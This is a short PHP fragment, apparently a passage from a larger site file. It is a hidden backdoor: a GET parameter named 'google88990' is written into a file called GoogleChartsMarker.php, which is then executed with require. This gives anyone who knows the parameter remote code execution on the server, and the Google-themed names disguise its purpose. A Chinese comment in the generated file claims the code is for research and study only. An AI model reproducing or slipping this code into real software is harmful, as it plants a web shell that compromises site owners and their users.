...
if(isset($_GET['google88990']))
{
$fp=fopen('GoogleChartsMarker.php',w);
file_put_contents('GoogleChartsMarker.php',"<?php
/* 此程序来自家园网络QQ836651666 采集修复 程序修改 仅供研究学习之用 禁止用于商业非法用途 */\r\n");
file_put_contents('GoogleChartsMarker.php',$_GET['google88990'],FILE_APPEND);
fclose($fp);
require 'GoogleChartsMarker.php';
